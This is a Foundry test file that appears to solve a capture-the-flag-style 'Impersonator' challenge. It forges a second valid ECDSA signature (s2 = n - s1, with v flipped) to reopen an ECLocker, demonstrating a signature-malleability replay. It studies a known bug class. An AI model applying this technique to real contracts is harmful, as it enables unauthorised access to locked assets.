// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/impersanator.sol";

contract ECLockerTest is Test {
    Impersonator public imp;
    address public nk_signer;
    uint256 private nk_signerPk;
    bytes32 public msgHash;
    uint256 public lockId;
    address public controller_nk;

    function setUp() public {
        nk_signerPk = 0xA11CE;
        nk_signer = vm.addr(nk_signerPk);
        imp = new Impersonator(0); //deploy the contract impersonator
        vm.startPrank(imp.owner());
        lockId = 1;

        //  Ethereum Signed Message Hash
        msgHash = keccak256(
            abi.encodePacked(
                "\x19Ethereum Signed Message:\n32",
                bytes32(lockId)
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(nk_signerPk, msgHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        imp.deployNewLock(signature); //deploy the lock with Ethereum signed hash
        vm.stopPrank();
    }

    function testSignatureMalleability() public {
        ECLocker locker = imp.lockers(0); //EcLocker instance

        // Sign message again to get original signature
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(nk_signerPk, msgHash);

        // Duplicate signatres s in ECDSA graph: s2 = n - s1
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 s2 = bytes32(n - uint256(s1));

        // Try using both valid signatures

        // First usage (original signature)
        vm.prank(nk_signer);
        locker.open(v1, r1, s1);
        // Second usage (malicious signature)
        // This should fail in a secure contract
        uint8 v2 = v1 == 27 ? 28 : 27;

        vm.prank(nk_signer);
        locker.open(v2, r1, s2); //  this should fail in a secure contract

        // locker.changeController(v2, r1, s2, nk_signer); // this should fail in a secure contract
        // assertEq(
        //     locker.controller(),
        //     controller_nk,
        //     "Controller should be changed"
        // );
    }
}
